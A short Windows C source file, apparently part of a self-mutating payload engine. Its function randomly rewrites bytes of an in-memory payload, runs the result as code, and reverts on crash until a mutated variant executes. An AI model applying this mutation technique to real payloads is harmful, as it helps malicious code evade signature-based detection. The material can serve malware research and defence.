#include <stdio.h>
#include <Windows.h>
#include <sys\timeb.h>
#include "Unicorn2.h"

UINT8 BackupBuf[x86MaxInsLen] = { 0x0 };

void MuNxtPayload()
{
    static struct timeb AccuTime;
    ftime(&AccuTime);
    srand((unsigned)AccuTime.time); // For standlone thread
    
    while(1)
    {
        printf("Finding Liveable Mutation Position...\n");
        MuPos = rand() % (NextPayloadSize - 5 - x86MaxInsLen) + 4; // Keep first 4 bytes and last 1 byte
        for(int i=0; i<x86MaxInsLen; i++)
        {
            BackupBuf[i] = nextPayloadBuf[MuPos + i];
            nextPayloadBuf[MuPos + i] = rand() % 256;
        }
        __try
        {
            ((void(*)())(nextPayloadBuf + 1))();
            printf("Mutation Success @ 0x%X\n", MuPos);
            break;
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            printf("Mutation Failed @ 0x%X, revert x86 code\n", MuPos);
            MuWatchDog = time(NULL);
            for(int i=0; i<x86MaxInsLen; i++)
            {
                nextPayloadBuf[MuPos + i] = BackupBuf[i];
            }
        }
    }
}